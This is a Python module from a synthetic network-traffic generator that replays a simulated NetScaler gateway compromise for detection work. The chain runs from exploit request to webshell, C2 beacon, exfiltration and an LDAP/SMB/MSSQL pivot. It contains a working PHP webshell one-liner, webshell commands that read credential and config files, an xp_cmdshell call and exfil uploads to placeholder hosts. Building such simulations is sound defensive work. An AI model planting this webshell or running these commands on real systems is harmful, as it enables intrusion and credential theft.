"""netgen.netscaler88771 -- the "NetScaler CVE-2026-88771" incident-replay scenario.

A SECOND, self-contained Citrix NetScaler/Gateway compromise, modelled as its own selectable
scenario (``ir-netscaler-cve88771``, category "Incident Replay"). It is a SIBLING of
``netgen.netscaler`` (the earlier "NetScaler Compromise" replay), not a variant of it: a DIFFERENT
offender exploits the same class of appliance via CVE-2026-88771 (an unauthenticated
NetScaler/Gateway remote-code-execution), drops a webshell, beacons to its own C2, and pivots
inward to the domain controller and the SQL server.

WHY A SIBLING PACKAGE (not an edit to netscaler/): netscaler/ stays the faithful replay of the
first incident, and this package carries the new campaign so neither disturbs the other. It REUSES netscaler/'s emitter helpers (the crafted
TLS 1.3 handshake, the JA4H-aware HTTP, the LDAP/SMB/C2 phases) and the gateway's identity
(EXL-CAG1 VIP/SNIP), and adds only what is specific to this campaign: its own offender and C2/exfil
sinks, the CVE-2026-88771 exploit-then-webshell chain, and a real TDS (MSSQL) pivot to EXL-SQL1.

RFC 791 / network-observable: every emitted packet is a real IPv4 datagram the engine puts on the
wire (internal RFC 1918 estate + RFC 5737 documentation ranges for the external actors), readable
by a sensor. The HTTPS phases carry a genuine TLS 1.3 handshake with the HTTP as cleartext in the
record (decrypts with the exported keys); the LDAP, SMB and TDS phases are cleartext and fully
decodable.

PIN-SAFE (the hard rule -- a scenario may only ADD, never ALTER the baseline): every host this
scenario needs is injected into ``ctx.h`` INSIDE ``build()``, which runs only when the scenario is
selected and only after ``day.build()`` has scheduled the normal day over the original inventory.
A build that does not select this scenario is byte-for-byte the baseline.
"""
import os

from netgen import flows as F
from netgen.identity import H, get_current
from netgen import protocols as P
from netgen.core import Host

# Reuse the sibling's emitter toolkit and the gateway identity -- this scenario is the SAME class
# of appliance hit by a different actor, so it is correct (and keeps the two in lock-step) to share
# the gateway's address/MAC and the HTTP/TLS/LDAP/SMB/C2 builders.
from netgen.netscaler import phases as NSP
from netgen.netscaler import content
from netgen.netscaler.phases import _https_open, _http_req, _https_msg
from netgen.netscaler import (_host, _GW_MAC, _VIP_SUFFIX, _VIP_IP,
                              _SNIP_SUFFIX, _SNIP_IP)

rng = NSP.rng


# ---- this campaign's own external actors (distinct from netscaler/'s) ----------------------
# TEST-NET-3 for the offender, TEST-NET-1 for the sinks -- deliberately different IPs from the
# first replay (198.51.100.74 / 192.0.2.21-22) so a capture with both selected never conflates
# the two campaigns.
_EXTERNAL = {
    "attacker": ("scan88.edge-probe.example", "203.0.113.88", 11),   # offender / exploit / webshell op
    "beacon":   ("sync.whipshot-cloud.example", "192.0.2.88", 13),   # TCP 8443 heartbeat sink
    "exfil":    ("cdn-citrix-patch.com",       "192.0.2.89", 15),    # HTTP PUT exfil sink (IOC domain)
    # own benign-workforce identities (shared defect #28): see metabase72898's comment.
    "wfA": ("host-a.whipshot-cloud.example", "198.51.100.41", 7),
    "wfB": ("host-b.whipshot-cloud.example", "198.51.100.42", 7),
    "wfC": ("host-c.whipshot-cloud.example", "198.51.100.43", 7),
    "wfD": ("host-d.whipshot-cloud.example", "198.51.100.44", 7),
}


def _inject_hosts(ctx):
    """Add the gateway's two faces (same EXL-CAG1 identity as netscaler/, shared MAC) and this
    campaign's external actors. Pin-safe: runs in the builder, after the baseline day is built."""
    domain = P.DOMAIN
    snip_name, vip_name = _host(ctx, _SNIP_SUFFIX), _host(ctx, _VIP_SUFFIX)
    if snip_name not in ctx.h:
        ctx.h[snip_name] = Host(snip_name, ctx.link.place(_SNIP_IP), _GW_MAC, "freebsd netscaler",
                                "NetScaler SNIP (gateway mgmt)", ctx.link.server_net,
                                "netscaler." + domain)
        ctx.h[vip_name] = Host(vip_name, ctx.link.place(_VIP_IP), _GW_MAC, "freebsd netscaler",
                               "Citrix Gateway VIP (portal)", ctx.link.server_net,
                               "vpn." + domain)
    cache = ctx.__dict__.setdefault("_ns88771_ext", {})
    for key, (fqdn, ip, hops) in _EXTERNAL.items():
        if key not in cache:
            h = Host(fqdn.split(".")[0].upper(), ip,
                     "02:00:5e:%02x:%02x:%02x" % (rng.randrange(256), rng.randrange(256), rng.randrange(256)),
                     "linux", "external", ip.rsplit(".", 1)[0] + ".0/24", fqdn)
            h.hops = hops
            cache[key] = h
    return cache


# ---- CVE-2026-88771-specific phases (everything else is reused from netscaler.phases) ------
# Distinct campaign artefacts: the implant's own UA, the webshell path/cookies the operator uses,
# and the decoded command -> plausible output-size map.
_IMPLANT_UA = "Mozilla/5.0 (X11; Linux x86_64) wh1psh3ll/2.6 "
_WS_PATH = "/logon/LogonPoint/custom/receiver.min.css"      # the planted webshell, masked as an asset
_WS_COOKIE = "CsrfToken=0; NSC_TASS=c2hlbGw; NSC_TMAS=on"   # operator's control cookies
_WS_CMDS = {
    "whoami": (21,), "id": (138,), "uname -a": (121,),
    "cat /flash/nsconfig/ns.conf": (918,), "ls /var/netscaler/logon/": (164, 240),
    "netstat -anp | grep EST": (512, 690), "cat /nsconfig/.htpasswd": (96,),
}
# observed webshell command log for this campaign: (offset_s_from_window_open, command)
_WEBSHELL_LOG = [
    (41, "whoami"), (118, "uname -a"), (263, "ls /var/netscaler/logon/"),
    (372, "cat /flash/nsconfig/ns.conf"), (601, "id"), (884, "netstat -anp | grep EST"),
    (1322, "cat /nsconfig/.htpasswd"), (1810, "ls /var/netscaler/logon/"),
    (2170, "cat /flash/nsconfig/ns.conf"),
]


def cve_exploit(ctx, atk, vip, ts=None):
    """Stage 1a -- the CVE-2026-88771 exploit request: an unauthenticated POST to the Gateway
    endpoint with an over-long crafted body; the appliance answers 200 and is now RCE-able."""
    host = "%s:443" % vip.ip
    s = _https_open(ctx, atk, vip, ts, "implant", sni=None, vantage=vip)
    payload = b"NSC_USER=" + b"A" * 4200 + b"&NSC_NONCE=" + os.urandom(24).hex().encode()   # over-long -> memory corruption
    # NOTE: a model of the named class, not a real exploit shape (the CVE label is generator-owned).
    req = _http_req("POST", "/gwtest/../vpns/cfg/smb.conf", host, _IMPLANT_UA,
                    extra=["Content-Type: application/x-www-form-urlencoded"], body=payload)
    _https_msg(s, req, P.http_response("200 OK", content.fit("<html><body>Gateway test page</body></html>\n", 146),
                                       "text/html", s.t, server="Apache"))
    return F.merged(s._ns_pre, s.close(think=rng.uniform(0.05, 0.3)))


def webshell_write(ctx, atk, vip, ts=None):
    """Stage 1b -- drop the webshell: a PUT that writes receiver.min.css into the custom-logon dir."""
    host = "%s:443" % vip.ip
    s = _https_open(ctx, atk, vip, ts, "implant", sni=None, vantage=vip)
    shell = b"<?php if(isset($_COOKIE['CsrfToken'])) system(base64_decode($_SERVER['HTTP_X_CMD'])); ?>"
    req = _http_req("PUT", _WS_PATH, host, _IMPLANT_UA, body=shell)
    _https_msg(s, req, P.http_response("201 Created", b"", "text/plain", s.t, server="Apache"))
    return F.merged(s._ns_pre, s.close(think=rng.uniform(0.05, 0.3)))


def webshell_cmd(ctx, atk, vip, cmd, ts=None):
    """Stage 1c -- run one command through the webshell: base64 command in X-Cmd, the operator's
    control cookie present, GET of the planted asset; body size encodes the command output."""
    import base64
    host = "%s:443" % vip.ip
    body_n = rng.choice(_WS_CMDS[cmd])
    extra = ["X-Cmd: %s" % base64.b64encode(cmd.encode()).decode()]
    s = _https_open(ctx, atk, vip, ts, "implant", sni=None, vantage=vip)
    req = _http_req("GET", _WS_PATH, host, _IMPLANT_UA, cookie=_WS_COOKIE,
                    referer="https://%s/vpn/index.html" % vip.ip, extra=extra)
    out = content.netscaler_cmd_output(cmd, body_n, NSP._conf_cache(ctx, vip) if cmd.startswith("cat /flash") else b"",
                                       vip.ip, ctx.link.place(_SNIP_IP), ctx.link.user_net.rsplit(".", 1)[0])
    _https_msg(s, req, P.http_response("200 OK", out, "text/plain", s.t, server="Apache"))
    return F.merged(s._ns_pre, s.close(think=rng.uniform(0.05, 0.3)))


def tds_pivot(ctx, snip, sql, ts=None):
    """Stage 3c -- the SQL pivot: the gateway (as the estate's svc_sql, a SQL login) logs in to
    EXL-SQL1 over TDS/1433, enumerates databases and identity, then an xp_cmdshell attempt that the
    server blocks. Cleartext TDS, fully decodable."""
    out = ctx.arp_for(snip, sql, ts, vantage=snip)
    s = ctx.tcp(snip, sql, 1433, ts + 0.001, vantage=snip).handshake()
    s.c2s(P.tds_prelogin(True), think=0.0006)
    s.s2c(P.tds_prelogin(False), think=rng.uniform(0.0005, 0.003))
    s.c2s(P.tds_login7("svc_sql", app="Core .Net SqlClient Data Provider",
                       host="NETSCALER-SNIP", db="master"), think=0.001)
    s.s2c(P.tds_login_ack(db="master"), think=rng.uniform(0.001, 0.005))
    s.c2s(P.tds_sql_batch("SELECT name FROM sys.databases"), think=0.002)
    s.s2c(P.tds_split(0x04, P.tds_result([("name", "nvarchar")],
                                         [("master",), ("tempdb",), ("model",), ("msdb",), ("Logistics",)]), s.dport),
          think=rng.uniform(0.01, 0.1))
    s.c2s(P.tds_sql_batch("SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')"), think=0.002)
    s.s2c(P.tds_split(0x04, P.tds_result([("u", "nvarchar"), ("sysadmin", "int")],
                                         [("svc_sql", 1)]), s.dport), think=rng.uniform(0.01, 0.1))
    s.c2s(P.tds_sql_batch("EXEC xp_cmdshell 'whoami'"), think=0.002)
    s.s2c(P.tds_split(0x04, P.tds_error(15281,
          "SQL Server blocked access to procedure 'sys.xp_cmdshell' because this component is turned off.",
          severity=16, spid=s.dport % 200), s.dport), think=rng.uniform(0.01, 0.1))
    return F.merged(out, s.close(by_client=True, think=rng.uniform(0.05, 0.3)))


# subset of netscaler.phases._ENUM for this campaign's LDAP enum, ending in the SPN scan
_ENUM = [("samAccountName", NSP.BIND_ACCOUNT), ("samAccountName", "administrator"),
         ("samAccountName", "svc_sql"), ("objectClass", "group"),
         ("memberOf", "CN=Domain Admins,OU=Groups," + P.BASE_DN), ("__SPN__", "*")]


def build(ctx, eng, tag, win):
    """Schedule the CVE-2026-88771 incident across its window: exploit -> webshell -> C2 beacon ->
    internal pivot (LDAP SPN scan -> SMB -> TDS/MSSQL). Signature-critical records are always
    emitted; the beacon cadence and benign portal volume scale with ctx.scale. Registered as the
    ``ir-netscaler-cve88771`` scenario in netgen.incidents (imported lazily there to avoid a cycle)."""
    ext = _inject_hosts(ctx)
    from netgen import incidents as INC
    s = INC.sched_factory(eng, ctx, tag, win)
    lo, hi = win
    scale = max(0.01, min(1.0, getattr(ctx, "scale", 1.0)))

    def at(offset):
        return lo + offset

    vip = ctx.h[_host(ctx, _VIP_SUFFIX)]
    snip = ctx.h[_host(ctx, _SNIP_SUFFIX)]
    dc1 = ctx.h.get(_host(ctx, "DC1"))
    dc2 = ctx.h.get(_host(ctx, "DC2"))
    sql1 = ctx.h.get(_host(ctx, "SQL1"))
    atk, beacon, exfil = ext["attacker"], ext["beacon"], ext["exfil"]

    # ---- Stage 1: exploit + webshell (inbound HTTPS, offender -> VIP) ----------------------
    s(at(12), cve_exploit, atk, vip)
    s(at(27), webshell_write, atk, vip)
    for off, cmd in _WEBSHELL_LOG:
        s(at(90 + off), webshell_cmd, atk, vip, cmd)

    # ---- Stage 2: outbound C2 (SNIP -> beacon :8443) + first-seen C2 DNS (NXDOMAIN) --------
    if dc1 is not None:
        s(at(905), NSP.c2_dns, snip, dc1, "sync.whipshot-cloud.example")
        s(at(1148), NSP.c2_dns, snip, dc1, "cdn-citrix-patch.com")
    t, counter = at(930), 1
    while t < hi:
        s(t, NSP.c2_beacon, snip, beacon, counter)
        counter += 1
        t += rng.uniform(60, 100)

    # ---- Stage 2b: config exfil (cleartext HTTP PUT of the stolen ns.conf) -----------------
    from netgen.netscaler import nsconf
    # this campaign's own artefact: a different appliance name and stanza numbering from the first
    # incident's ns.conf, so the two captures never share a 200,015-byte file
    body = nsconf.ns_conf(vip=vip.ip, snip=snip.ip, domain=P.DOMAIN,
                       server_pfx=".".join(str(b) for b in ctx.link.fw_b.ipb[:3]),
                       hostname="netscaler-gw02", n0=400)
    s(at(1210), NSP.config_exfil, snip, exfil, body, path="/upload/gw02_nsconfig.bak")
    # Stage 2c: bulk data exfil -- the HIGH-volume stage (tens of MB), so a bytes-to-attacker view
    # separates it from the ~KB config PUT above and the hundreds-of-bytes beacons.
    s(at(1255), NSP.data_exfil, snip, exfil, int(28_000_000 * scale), label="ns-sessions.tar")

    # ---- Stage 3: internal pivot -- LDAP SPN scan (389) -> SMB (445) -> TDS/MSSQL (1433) ---
    if dc1 is not None:
        s(at(1500), NSP.ldaps_routine, snip, dc1)          # routine baseline bind (contrast)
        s(at(1560), NSP.ldap_enum_run, snip, dc1, _ENUM, [i * 4 for i in range(len(_ENUM))])
        s(at(1620), NSP.smb_fail, snip, dc1)
    if dc2 is not None:
        s(at(1622), NSP.smb_fail, snip, dc2)
    if sql1 is not None:
        s(at(1700), tds_pivot, snip, sql1)

    # ---- benign interleave: normal workforce portal traffic around the attack --------------
    for label in ("A", "B", "C", "D"):
        visits = max(2, int(round(10 * scale)))
        for _ in range(visits):
            client = ext[{"A": "wfA", "B": "wfB", "C": "wfC", "D": "wfD"}[label]]
            s(lo + rng.uniform(0, max(1.0, hi - lo - 60)), NSP.portal_browse, client, vip, label)
